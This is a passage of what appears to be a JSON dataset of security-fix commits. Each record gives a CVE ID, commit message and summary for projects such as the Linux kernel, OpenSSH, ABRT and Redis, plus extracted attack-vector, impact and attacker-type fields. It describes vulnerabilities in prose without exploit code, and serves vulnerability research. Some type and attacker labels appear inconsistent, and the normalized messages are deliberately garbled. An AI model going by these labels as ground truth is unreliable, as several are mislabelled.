00000000000006a0\n[135546.064723] Stack:\n[135546.065048]  ffffffffafe2055c ffffffffafe23fc1 ffffed00493097bf ffff8801ec3d0008\n[135546.066247]  0000000000000000 00000000000000d0 0000000000000000 ac194a24c0586342\n[135546.067438]  1ffff100178e1f78 ffff880320581b00 ffff8800bc70fdd0 ffff880320581b00\n[135546.068629] Call Trace:\n[135546.069028] ? __rds_conn_create (include\/linux\/rcupdate.h:856 net\/rds\/connection.c:134)\n[135546.069989] ? rds_message_copy_from_user (net\/rds\/message.c:298)\n[135546.071021] rds_conn_create_outgoing (net\/rds\/connection.c:278)\n[135546.071981] rds_sendmsg (net\/rds\/send.c:1058)\n[135546.072858] ? perf_trace_lock (include\/trace\/events\/lock.h:38)\n[135546.073744] ? lockdep_init (kernel\/locking\/lockdep.c:3298)\n[135546.074577] ? rds_send_drop_to (net\/rds\/send.c:976)\n[135546.075508] ? __might_fault (.\/arch\/x86\/include\/asm\/current.h:14 mm\/memory.c:3795)\n[135546.076349] ? __might_fault (mm\/memory.c:3795)\n[135546.077179] ? rds_send_drop_to (net\/rds\/send.c:976)\n[135546.078114] sock_sendmsg (net\/socket.c:611 net\/socket.c:620)\n[135546.078856] SYSC_sendto (net\/socket.c:1657)\n[135546.079596] ? SYSC_connect (net\/socket.c:1628)\n[135546.080510] ? trace_dump_stack (kernel\/trace\/trace.c:1926)\n[135546.081397] ? ring_buffer_unlock_commit (kernel\/trace\/ring_buffer.c:2479 kernel\/trace\/ring_buffer.c:2558 kernel\/trace\/ring_buffer.c:2674)\n[135546.082390] ? trace_buffer_unlock_commit (kernel\/trace\/trace.c:1749)\n[135546.083410] ? trace_event_raw_event_sys_enter (include\/trace\/events\/syscalls.h:16)\n[135546.084481] ? do_audit_syscall_entry (include\/trace\/events\/syscalls.h:16)\n[135546.085438] ? trace_buffer_unlock_commit (kernel\/trace\/trace.c:1749)\n[135546.085515] rds_ib_laddr_check(): addr 36.74.25.172 ret -99 node type -1\n\nAcked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com>\nSigned-off-by: Sasha Levin <sasha.levin@oracle.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The __rds_conn_create function in net\/rds\/connection.c in the Linux kernel through 4.2.3 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by using a socket that was not properly bound.","commit_message_1":"verify the underlying transport exists before creating a connection there wa no verification that an underlying transport exists when creating a connection , this would cause dereferencing a null ptr","Vulnerability Type":"NULL pointer dereference","Attack Vector":"by using a socket that was not properly bound","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"5e75f5198769056089fb06c4d738ab0e5abc66f7","cve_id":"CVE-2015-6564","cwe_id":"CWE-264","commit_message":"set sshpam_ctxt to NULL after free\n\nAvoids use-after-free in monitor when privsep child is compromised.\nReported by Moritz Jodeit; ok dtucker@","summary":"Use-after-free vulnerability in the mm_answer_pam_free_ctx function in monitor.c in sshd in OpenSSH before 7.0 on non-OpenBSD platforms might allow local users to gain privileges by leveraging control of the sshd uid to send an unexpectedly early MONITOR_REQ_PAM_FREE_CTX request.","commit_message_1":"set sshpam_ctxt to null after free avoids use-after-free in monitor when privsep child is compromised","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging control of the sshd uid to send an unexpectedly early monitor _ req _ pam _ free _ ctx request","Impact":"gain privileges","Root Cause":"caused by a use-after-free error","Attack Type":"local attacker"},{"commit_id":"d4697fe9a28dab7255c60433e4dd23cf7fce8a8b","cve_id":"CVE-2015-6563","cwe_id":"CWE-20","commit_message":"Don't resend username to PAM; it already has it.\n\nPointed out by Moritz Jodeit; ok dtucker@","summary":"The monitor component in sshd in OpenSSH before 7.0 on non-OpenBSD platforms accepts extraneous username data in MONITOR_REQ_PAM_INIT_CTX requests, which allows local users to conduct impersonation attacks by leveraging any SSH login access in conjunction with control of the sshd uid to send a crafted MONITOR_REQ_PWNAM request, related to monitor.c and monitor_wrap.c.","commit_message_1":"do n't resend username to pam ; it already ha it","Vulnerability Type":"Improper Input Validation","Attack Vector":"by leveraging any ssh login access in conjunction with control of the sshd uid to send a crafted monitor _ req _ pwnam request , related to monitor . c","Impact":"conduct impersonation attacks","Root Cause":"caused by the acceptance of extraneous username data","Attack Type":"local attacker"},{"commit_id":"9a5cbce421a283e6aea3c4007f141735bf9da8c3","cve_id":"CVE-2015-6526","cwe_id":"CWE-399","commit_message":"powerpc\/perf: Cap 64bit userspace backtraces to PERF_MAX_STACK_DEPTH\n\nWe cap 32bit userspace backtraces to PERF_MAX_STACK_DEPTH\n(currently 127), but we forgot to do the same for 64bit backtraces.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Anton Blanchard <anton@samba.org>\nSigned-off-by: Michael Ellerman <mpe@ellerman.id.au>","summary":"The perf_callchain_user_64 function in arch\/powerpc\/perf\/callchain.c in the Linux kernel before 4.0.2 on ppc64 platforms allows local users to cause a denial of service (infinite loop) via a deep 64-bit userspace backtrace.","commit_message_1":"cap 64bit userspace backtraces to perf_max_stack_depth we cap 32bit userspace backtraces to perf_max_stack_depth ( currently <number> ) , but we forgot to do the same for 64bit backtraces","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a deep 64 - bit userspace backtrace","Impact":"cause a denial of service ( infinite loop )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"46844402bca7a38fc224483ba6f0a93c4613203f","cve_id":"CVE-2015-6520","cwe_id":"CWE-264","commit_message":"SECURITY FIX: Actually restrict the access to the printer to localhost\n\nBefore, any machine in any network connected by any of the interfaces (as\nlisted by \"ifconfig\") could access to an IPP-over-USB printer on the assigned\nport, allowing users on remote machines to print and to access the web\nconfiguration interface of a IPP-over-USB printer in contrary to conventional\nUSB printers which are only accessible locally.","summary":"IPPUSBXD before 1.22 listens on all interfaces, which allows remote attackers to obtain access to USB connected printers via a direct request.","commit_message_1":"actually restrict the access to the printer to localhost before , any machine in any network connected by any of the interface ( a listed by `` ifconfig '' ) could access to an ipp-over-usb printer on the assigned port , allowing user on remote machine to print and to access the web configuration interface of a ipp-over-usb printer in contrary to conventional usb printer which are only accessible locally","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a direct request","Impact":"obtain access to usb connected printers","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"7932c0bd7740f4cd2aa168d3ce0199e7af7d72d5","cve_id":"CVE-2015-6252","cwe_id":"CWE-399","commit_message":"vhost: actually track log eventfd file\n\nWhile reviewing vhost log code, I found out that log_file is never\nset. Note: I haven't tested the change (QEMU doesn't use LOG_FD yet).\n\nCc: stable@vger.kernel.org\nSigned-off-by: Marc-Andr\u00e9 Lureau <marcandre.lureau@redhat.com>\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>","summary":"The vhost_dev_ioctl function in drivers\/vhost\/vhost.c in the Linux kernel before 4.1.5 allows local users to cause a denial of service (memory consumption) via a VHOST_SET_LOG_FD ioctl call that triggers permanent file-descriptor allocation.","commit_message_1":"actually track log eventfd file while reviewing vhost log code , i found out that log_file is never set","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a vhost _ set _ log _ fd ioctl call that triggers permanent file - descriptor allocation","Impact":"cause a denial of service ( memory consumption )","Root Cause":"caused by the improper handling of userspace provided log fd while processing VHOST_SET_LOG_FD ioctl command by the vhost driver","Attack Type":"local attacker"},{"commit_id":"79cca974a4c2ab1199786732a67ff6d898051b78","cve_id":"CVE-2015-6031","cwe_id":"CWE-119","commit_message":"igd_desc_parse.c: fix buffer overflow","summary":"Buffer overflow in the IGDstartelt function in igd_desc_parse.c in the MiniUPnP client (aka MiniUPnPc) before 1.9.20150917 allows remote UPNP servers to cause a denial of service (application crash) and possibly execute arbitrary code via an *oversized* XML element name.","commit_message_1":"<file> : fix buffer overflow","Vulnerability Type":"buffer overflow","Attack Vector":"via an * oversized * xml element name","Impact":"cause a denial of service ( application crash ) and possibly execute arbitrary code","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"451a2886b6bf90e2fb378f7c46c655450fb96e81","cve_id":"CVE-2015-5707","cwe_id":"CWE-189","commit_message":"sg_start_req(): make sure that there's not too many elements in iovec\n\nunfortunately, allowing an arbitrary 16bit value means a possibility of\noverflow in the calculation of total number of pages in bio_map_user_iov() -\nwe rely on there being no more than PAGE_SIZE members of sum in the\nfirst loop there.  If that sum wraps around, we end up allocating\ntoo small array of pointers to pages and it's easy to overflow it in\nthe second loop.\n\nX-Coverup: TINC (and there's no lumber cartel either)\nCc: stable@vger.kernel.org # way, way back\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"Integer overflow in the sg_start_req function in drivers\/scsi\/sg.c in the Linux kernel 2.6.x through 4.x before 4.1 allows local users to cause a denial of service or possibly have unspecified other impact via a large iov_count value in a write request.","commit_message_1":"make sure that there 's not too many element in iovec unfortunately , allowing an arbitrary 16bit value mean a possibility of overflow in the calculation of total number of page in bio_map_user_iov ( ) - we rely on there being no more than page_size member of sum in the first loop there","Vulnerability Type":"integer overflow","Attack Vector":"via a large iov _ count value in a write request","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"f15133df088ecadd141ea1907f2c96df67c729f0","cve_id":"CVE-2015-5706","cwe_id":null,"commit_message":"path_openat(): fix double fput()\n\npath_openat() jumps to the wrong place after do_tmpfile() - it has\nalready done path_cleanup() (as part of path_lookupat() called by\ndo_tmpfile()), so doing that again can lead to double fput().\n\nCc: stable@vger.kernel.org\t# v3.11+\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"Use-after-free vulnerability in the path_openat function in fs\/namei.c in the Linux kernel 3.x and 4.x before 4.0.4 allows local users to cause a denial of service or possibly have unspecified other impact via O_TMPFILE filesystem operations that leverage a duplicate cleanup operation.","commit_message_1":"fix double fput ( ) path_openat ( ) jump to the wrong place after do_tmpfile ( ) - it ha already done path_cleanup ( ) ( a part of path_lookupat ( ) called by do_tmpfile ( ) ) , so doing that again can lead to double fput ( )","Vulnerability Type":"use - after - free","Attack Vector":"via o _ tmpfile filesystem operations that leverage a duplicate cleanup operation","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"b6878d9e03043695dbf3fa1caa6dfc09db225b16","cve_id":"CVE-2015-5697","cwe_id":"CWE-200","commit_message":"md: use kzalloc() when bitmap is disabled\n\nIn drivers\/md\/md.c get_bitmap_file() uses kmalloc() for creating a\nmdu_bitmap_file_t called \"file\".\n\n5769         file = kmalloc(sizeof(*file), GFP_NOIO);\n5770         if (!file)\n5771                 return -ENOMEM;\n\nThis structure is copied to user space at the end of the function.\n\n5786         if (err == 0 &&\n5787             copy_to_user(arg, file, sizeof(*file)))\n5788                 err = -EFAULT\n\nBut if bitmap is disabled only the first byte of \"file\" is initialized\nwith zero, so it's possible to read some bytes (up to 4095) of kernel\nspace memory from user space. This is an information leak.\n\n5775         \/* bitmap disabled, zero the first byte and copy out *\/\n5776         if (!mddev->bitmap_info.file)\n5777                 file->pathname[0] = '\\0';\n\nSigned-off-by: Benjamin Randazzo <benjamin@randazzo.fr>\nSigned-off-by: NeilBrown <neilb@suse.com>","summary":"The get_bitmap_file function in drivers\/md\/md.c in the Linux kernel before 4.1.6 does not initialize a certain bitmap data structure, which allows local users to obtain sensitive information from kernel memory via a GET_BITMAP_FILE ioctl call.","commit_message_1":"use kzalloc ( ) when bitmap is disabled in drivers\/md\/<file> get_bitmap_file ( ) us kmalloc ( ) for creating a mdu_bitmap_file_t called `` file ''","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a get _ bitmap _ file ioctl call","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not initialize a certain bitmap data structure","Attack Type":"local attacker"},{"commit_id":"e809ea80e3527e32c40756eddd8b2ae44bc3af1a","cve_id":"CVE-2015-5685","cwe_id":"CWE-20","commit_message":"Check for out-of-bounds bencoded lengths before advancing buffer pointer","summary":"The lazy_bdecode function in BitTorrent DHT bootstrap server (bootstrap-dht ) allows remote attackers to execute arbitrary code via a crafted packet, related to *improper indexing.*","commit_message_1":"check for out-of-bounds bencoded length before advancing buffer pointer","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted packet , related to * improper indexing","Impact":"execute arbitrary code","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"beb39db59d14990e401e235faf66a6b9b31240b0","cve_id":"CVE-2015-5366","cwe_id":"CWE-399","commit_message":"udp: fix behavior of wrong checksums\n\nWe have two problems in UDP stack related to bogus checksums :\n\n1) We return -EAGAIN to application even if receive queue is not empty.\n   This breaks applications using edge trigger epoll()\n\n2) Under UDP flood, we can loop forever without yielding to other\n   processes, potentially hanging the host, especially on non SMP.\n\nThis patch is an attempt to make things better.\n\nWe might in the future add extra support for rt applications\nwanting to better control time spent doing a recv() in a hostile\nenvironment. For example we could validate checksums before queuing\npackets in socket receive queue.\n\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nCc: Willem de Bruijn <willemb@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The (1) udp_recvmsg and (2) udpv6_recvmsg functions in the Linux kernel before 4.0.6 provide inappropriate -EAGAIN return values, which allows remote attackers to cause a denial of service (EPOLLET epoll application read outage) via an incorrect checksum in a UDP packet, a different vulnerability than CVE-2015-5364.","commit_message_1":"fix behavior of wrong checksum we have two problem in udp stack related to bogus checksum : <number> ) we return -eagain to application even if receive queue is not empty","Vulnerability Type":"Resource Management Errors","Attack Vector":"via an incorrect checksum in a udp packet , a different vulnerability than cve - 2015 - 5364","Impact":"cause a denial of service ( epollet epoll application read outage )","Root Cause":"caused by the improper processing of malicious packets","Attack Type":"remote attacker"},{"commit_id":"54a20552e1eae07aa240fa370a0293e006b5faed","cve_id":"CVE-2015-5307","cwe_id":"CWE-399","commit_message":"KVM: x86: work around infinite loop in microcode when #AC is delivered\n\nIt was found that a guest can DoS a host by triggering an infinite\nstream of \"alignment check\" (#AC) exceptions.  This causes the\nmicrocode to enter an infinite loop where the core never receives\nanother interrupt.  The host kernel panics pretty quickly due to the\neffects (CVE-2015-5307).\n\nSigned-off-by: Eric Northup <digitaleric@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The KVM subsystem in the Linux kernel through 4.2.6, and Xen 4.3.x through 4.6.x, allows guest OS users to cause a denial of service (host OS panic or hang) by triggering many #AC (aka Alignment Check) exceptions, related to svm.c and vmx.c.","commit_message_1":"x86 : work around infinite loop in microcode when # ac is delivered it wa found that a guest can do a host by triggering an infinite stream of `` alignment check '' ( # ac ) exception","Vulnerability Type":"Resource Management Errors","Attack Vector":"by triggering many # ac ( aka alignment check ) exceptions , related to svm . c and vmx . c","Impact":"cause a denial of service ( host os panic or hang )","Root Cause":"caused by an error when processing an alignment check exception","Attack Type":"remote attacker"},{"commit_id":"257578a23d1537a2d235aaa2b1488ee4f818e360","cve_id":"CVE-2015-5302","cwe_id":"CWE-200","commit_message":"wizard: fix save users changes after reviewing dump dir files\n\nIf the user reviewed the dump dir's files during reporting the crash, the\nchanges was thrown away and original data was passed to the bugzilla bug\nreport.\n\nreport-gtk saves the first text view buffer and then reloads data from the\nreported problem directory, which causes that the changes made to those text\nviews are thrown away.\n\nFunction save_text_if_changed(), except of saving text, also reload the files\nfrom dump dir and update gui state from the dump dir. The commit moves the\nreloading and updating gui functions away from this function.\n\nRelated to rhbz#1270235\n\nSigned-off-by: Matej Habrnal <mhabrnal@redhat.com>","summary":"libreport 2.0.7 before 2.6.3 only saves changes to the first file when editing a crash report, which allows remote attackers to obtain sensitive information via unspecified vectors related to the (1) backtrace, (2) cmdline, (3) environ, (4) open_fds, (5) maps, (6) smaps, (7) hostname, (8) remote, (9) ks.cfg, or (10) anaconda-tb file attachment included in a Red Hat Bugzilla bug report.","commit_message_1":"fix save user change after reviewing dump dir file if the user reviewed the dump dir 's file during reporting the crash , the change wa thrown away and original data wa passed to the bugzilla bug report","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via unspecified vectors related to the ( 1 ) backtrace , ( 2 ) cmdline , ( 3 ) environ , ( 4 ) open _ fds , ( 5 ) maps , ( 6 ) smaps , ( 7 ) hostname , ( 8 ) remote , ( 9 ) ks . cfg , or ( 10 ) anaconda - tb file attachment included in a red hat bugzilla bug report","Impact":"obtain sensitive information","Root Cause":"caused by the saving of changes to the first file when editing a crash report","Attack Type":"remote attacker"},{"commit_id":"3c1b60cfa62d39e5fff5a53a5bc53dae189e740e","cve_id":"CVE-2015-5287","cwe_id":"CWE-59","commit_message":"ccpp: save abrt core files only to new files\n\nPrior this commit abrt-hook-ccpp saved a core file generated by a\nprocess running a program whose name starts with \"abrt\" in\nDUMP_LOCATION\/$(basename program)-coredump. If the file was a symlink,\nthe hook followed and wrote core file to the symlink's target.\n\nAddresses CVE-2015-5287\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>","summary":"The abrt-hook-ccpp help program in Automatic Bug Reporting Tool (ABRT) before 2.7.1 allows local users with certain permissions to gain privileges via a symlink attack on a file with a predictable name, as demonstrated by \/var\/tmp\/abrt\/abrt-hax-coredump or \/var\/spool\/abrt\/abrt-hax-coredump.","commit_message_1":"save abrt core file only to new file prior this commit abrt-hook-ccpp saved a core file generated by a process running a program whose name start with `` abrt '' in dump_location\/ $ ( basename program ) -coredump","Vulnerability Type":"Link Following","Attack Vector":"via a symlink attack on a file with a predictable name , as demonstrated by \/ var \/ tmp \/ abrt \/ abrt - hax - coredump or \/ var \/ spool \/ abrt \/ abrt - hax - coredump .","Impact":"gain privileges","Root Cause":"caused by the improper handling of symbolic links by the abrt-hook-ccpp","Attack Type":"local attacker"},{"commit_id":"8e2d61e0aed2b7c4ecb35844fe07e0b2b762dee4","cve_id":"CVE-2015-5283","cwe_id":"CWE-119","commit_message":"sctp: fix race on protocol\/netns initialization\n\nConsider sctp module is unloaded and is being requested because an user\nis creating a sctp socket.\n\nDuring initialization, sctp will add the new protocol type and then\ninitialize pernet subsys:\n\n        status = sctp_v4_protosw_init();\n        if (status)\n                goto err_protosw_init;\n\n        status = sctp_v6_protosw_init();\n        if (status)\n                goto err_v6_protosw_init;\n\n        status = register_pernet_subsys(&sctp_net_ops);\n\nThe problem is that after those calls to sctp_v{4,6}_protosw_init(), it\nis possible for userspace to create SCTP sockets like if the module is\nalready fully loaded. If that happens, one of the possible effects is\nthat we will have readers for net->sctp.local_addr_list list earlier\nthan expected and sctp_net_init() does not take precautions while\ndealing with that list, leading to a potential panic but not limited to\nthat, as sctp_sock_init() will copy a bunch of blank\/partially\ninitialized values from net->sctp.\n\nThe race happens like this:\n\n     CPU 0                           |  CPU 1\n  socket()                           |\n   __sock_create                     | socket()\n    inet_create                      |  __sock_create\n     list_for_each_entry_rcu(        |\n        answer, &inetsw[sock->type], |\n        list) {                      |   inet_create\n      \/* no hits *\/                  |\n     if (unlikely(err)) {            |\n      ...                            |\n      request_module()               |\n      \/* socket creation is blocked  |\n       * the module is fully loaded  |\n       *\/                            |\n       sctp_init                     |\n        sctp_v4_protosw_init         |\n         inet_register_protosw       |\n          list_add_rcu(&p->list,     |\n                       last_perm);   |\n                                     |  list_for_each_entry_rcu(\n                                     |     answer, &inetsw[sock->type],\n        sctp_v6_protosw_init         |     list) {\n                                     |     \/* hit, so assumes protocol\n                                     |      * is already loaded\n                                     |      *\/\n                                     |  \/* socket creation continues\n                                     |   * before netns is initialized\n                                     |   *\/\n        register_pernet_subsys       |\n\nSimply inverting the initialization order between\nregister_pernet_subsys() and sctp_v4_protosw_init() is not possible\nbecause register_pernet_subsys() will create a control sctp socket, so\nthe protocol must be already visible by then. Deferring the socket\ncreation to a work-queue is not good specially because we loose the\nability to handle its errors.\n\nSo, as suggested by Vlad, the fix is to split netns initialization in\ntwo moments: defaults and control socket, so that the defaults are\nalready loaded by when we register the protocol, while control socket\ninitialization is kept at the same moment it is today.\n\nFixes: 4db67e808640 (\"sctp: Make the address lists per network namespace\")\nSigned-off-by: Vlad Yasevich <vyasevich@gmail.com>\nSigned-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sctp_init function in net\/sctp\/protocol.c in the Linux kernel before 4.2.3 has an incorrect sequence of protocol-initialization steps, which allows local users to cause a denial of service (panic or memory corruption) by creating SCTP sockets before all of the steps have finished.","commit_message_1":"fix race on protocol\/netns initialization consider sctp module is unloaded and is being requested because an user is creating a sctp socket","Vulnerability Type":"buffer overflow","Attack Vector":"by creating sctp sockets before all of the steps have finished","Impact":"cause a denial of service ( panic or memory corruption )","Root Cause":"has an incorrect sequence of protocol - initialization steps","Attack Type":"local attacker"},{"commit_id":"50ee8130fb4cd4ef1af7682a2c85dd99cb99424e","cve_id":"CVE-2015-5273","cwe_id":"CWE-59","commit_message":"a-a-i-d-to-abrt-cache: make own random temporary directory\n\nThe set-user-ID wrapper must use own new temporary directory in order to\navoid security issues with unpacking specially crafted debuginfo\npackages that might be used to create files or symlinks anywhere on the\nfile system as the abrt user.\n\nWithot the forking code the temporary directory would remain on the\nfilesystem in the case where all debuginfo data are already available.\nThis is caused by the fact that the underlying libreport functionality\naccepts path to a desired temporary directory and creates it only if\nnecessary. Otherwise, the directory is not touched at all.\n\nThis commit addresses CVE-2015-5273\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>","summary":"The abrt-action-install-debuginfo-to-abrt-cache help program in Automatic Bug Reporting Tool (ABRT) before 2.7.1 allows local users to write to arbitrary files via a symlink attack on unpacked.cpio in a pre-created directory with a predictable name in \/var\/tmp.","commit_message_1":"make own random temporary directory the set-user-id wrapper must use own new temporary directory in order to avoid security issue with unpacking specially crafted debuginfo package that might be used to create file or symlinks anywhere on the file system a the abrt user","Vulnerability Type":"Link Following","Attack Vector":"via a symlink attack on unpacked . cpio in a pre - created directory with a predictable name in \/ var \/ tmp .","Impact":"write to arbitrary files","Root Cause":"by creating a symbolic link from a temporary file to various files on the system","Attack Type":"local attacker"},{"commit_id":"cbb4be652d374f64661137756b8f357a1827d6a4","cve_id":"CVE-2015-5257","cwe_id":null,"commit_message":"USB: whiteheat: fix potential null-deref at probe\n\nFix potential null-pointer dereference at probe by making sure that the\nrequired endpoints are present.\n\nThe whiteheat driver assumes there are at least five pairs of bulk\nendpoints, of which the final pair is used for the \"command port\". An\nattempt to bind to an interface with fewer bulk endpoints would\ncurrently lead to an oops.\n\nFixes CVE-2015-5257.\n\nReported-by: Moein Ghasemzadeh <moein@istuary.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Johan Hovold <johan@kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"drivers\/usb\/serial\/whiteheat.c in the Linux kernel before 4.2.4 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and OOPS) or possibly have unspecified other impact via a crafted USB device.  NOTE: this ID was incorrectly used for an Apache Cordova issue that has the correct ID of CVE-2015-8320.","commit_message_1":"whiteheat : fix potential null-deref at probe fix potential null-pointer dereference at probe by making sure that the required endpoint are present","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted usb device","Impact":"cause a denial of service ( pointer dereference and oops ) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"48900cb6af4282fa0fb6ff4d72a81aa3dadb5c39","cve_id":"CVE-2015-5156","cwe_id":"CWE-119","commit_message":"virtio-net: drop NETIF_F_FRAGLIST\n\nvirtio declares support for NETIF_F_FRAGLIST, but assumes\nthat there are at most MAX_SKB_FRAGS + 2 fragments which isn't\nalways true with a fraglist.\n\nA longer fraglist in the skb will make the call to skb_to_sgvec overflow\nthe sg array, leading to memory corruption.\n\nDrop NETIF_F_FRAGLIST so we only get what we can handle.\n\nCc: Michael S. Tsirkin <mst@redhat.com>\nSigned-off-by: Jason Wang <jasowang@redhat.com>\nAcked-by: Michael S. Tsirkin <mst@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The virtnet_probe function in drivers\/net\/virtio_net.c in the Linux kernel before 4.2 attempts to support a FRAGLIST feature without proper memory allocation, which allows guest OS users to cause a denial of service (buffer overflow and memory corruption) via a crafted sequence of fragmented packets.","commit_message_1":"drop netif_f_fraglist virtio declares support for netif_f_fraglist , but assumes that there are at most max_skb_frags + <number> fragment which is n't always true with a fraglist","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted sequence of fragmented packets","Impact":"cause a denial of service ( buffer overflow and memory corruption )","Root Cause":"support a fraglist feature without proper memory allocation ","Attack Type":"remote attacker"},{"commit_id":"3f7352bf21f8fd7ba3e2fcef9488756f188e12be","cve_id":"CVE-2015-4700","cwe_id":"CWE-17","commit_message":"x86: bpf_jit: fix compilation of large bpf programs\n\nx86 has variable length encoding. x86 JIT compiler is trying\nto pick the shortest encoding for given bpf instruction.\nWhile doing so the jump targets are changing, so JIT is doing\nmultiple passes over the program. Typical program needs 3 passes.\nSome very short programs converge with 2 passes. Large programs\nmay need 4 or 5. But specially crafted bpf programs may hit the\npass limit and if the program converges on the last iteration\nthe JIT compiler will be producing an image full of 'int 3' insns.\nFix this corner case by doing final iteration over bpf program.\n\nFixes: 0a14842f5a3c (\"net: filter: Just In Time compiler for x86-64\")\nReported-by: Daniel Borkmann <daniel@iogearbox.net>\nSigned-off-by: Alexei Starovoitov <ast@plumgrid.com>\nTested-by: Daniel Borkmann <daniel@iogearbox.net>\nAcked-by: Daniel Borkmann <daniel@iogearbox.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The bpf_int_jit_compile function in arch\/x86\/net\/bpf_jit_comp.c in the Linux kernel before 4.0.6 allows local users to cause a denial of service (system crash) by creating a packet filter and then loading crafted BPF instructions that trigger late convergence by the JIT compiler.","commit_message_1":"bpf_jit : fix compilation of large bpf program x86 ha variable length encoding","Vulnerability Type":"DEPRECATED: Code","Attack Vector":"by creating a packet filter and then loading crafted bpf instructions that trigger late convergence by the jit compiler ","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"ce40cd3fc7fa40a6119e5fe6c0f2bc0eb4541009","cve_id":"CVE-2015-4692","cwe_id":null,"commit_message":"kvm: x86: fix kvm_apic_has_events to check for NULL pointer\n\nMalicious (or egregiously buggy) userspace can trigger it, but it\nshould never happen in normal operation.\n\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The kvm_apic_has_events function in arch\/x86\/kvm\/lapic.h in the Linux kernel through 4.1.3 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by leveraging \/dev\/kvm access for an ioctl call.","commit_message_1":"x86 : fix kvm_apic_has_events to check for null pointer malicious ( or egregiously buggy ) userspace can trigger it , but it should never happen in normal operation","Vulnerability Type":"NULL pointer dereference","Attack Vector":"by leveraging \/ dev \/ kvm access for an ioctl call","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"5e7b9ec688d79e7b16ec7064e1d37e8481a31e72","cve_id":"CVE-2015-4590","cwe_id":"CWE-119","commit_message":"Fix buffer overflow (pull request #81)","summary":"The extractFrom function in Internals\/QuotedString.cpp in Arduino JSON before 4.5 allows remote attackers to cause a denial of service (crash) via a JSON string with a  (backslash) followed by a terminator, as demonstrated by *0*, which triggers a buffer overflow and over-read.","commit_message_1":"fix buffer overflow ( pull request # <number> )","Vulnerability Type":"buffer overflow","Attack Vector":"via a json string with a ( backslash ) followed by a terminator , as demonstrated by * 0 * , which triggers a buffer overflow and over - read","Impact":"cause a denial of service ( crash )","Root Cause":"caused by improper bounds checking when parsing JSON strings","Attack Type":"remote attacker"},{"commit_id":"18b6a2cc0b87536015bedd4f7763e6b02d5aa4f3","cve_id":"CVE-2015-4471","cwe_id":"CWE-189","commit_message":"Prevent a 1-byte underread of the input buffer if an odd-sized data block comes just before an uncompressed block header","summary":"Off-by-one error in the lzxd_decompress function in lzxd.c in libmspack before 0.5 allows remote attackers to cause a denial of service (buffer under-read and application crash) via a crafted CAB archive.","commit_message_1":"prevent a <number>-byte underread of the input buffer if an odd-sized data block come just before an uncompressed block header","Vulnerability Type":"Numeric Errors","Attack Vector":"via a crafted cab archive","Impact":"cause a denial of service ( buffer under - read and application crash )","Root Cause":"an off-by-one buffer under-read","Attack Type":"remote attacker"},{"commit_id":"fdf9d455098f54f7666c702ae464e6ea21e25411","cve_id":"CVE-2015-4335","cwe_id":"CWE-17","commit_message":"disable loading lua bytecode","summary":"Redis before 2.8.21 and 3.x before 3.0.2 allows remote attackers to execute arbitrary Lua bytecode via the eval command.","commit_message_1":"disable loading lua bytecode","Vulnerability Type":"DEPRECATED: Code","Attack Vector":"via the eval command","Impact":"execute arbitrary lua bytecode","Root Cause":"caused by the insecure loading of Lua bytcode by the loadstring function","Attack Type":"remote attacker"},{"commit_id":"23b133bdc452aa441fcb9b82cbf6dd05cfd342d0","cve_id":"CVE-2015-4167","cwe_id":"CWE-189","commit_message":"udf: Check length of extended attributes and allocation descriptors\n\nCheck length of extended attributes and allocation descriptors when\nloading inodes from disk. Otherwise corrupted filesystems could confuse\nthe code and make the kernel oops.\n\nReported-by: Carl Henrik Lunde <chlunde@ping.uio.no>\nCC: stable@vger.kernel.org\nSigned-off-by: Jan Kara <jack@suse.cz>","summary":"The udf_read_inode function in fs\/udf\/inode.c in the Linux kernel before 3.19.1 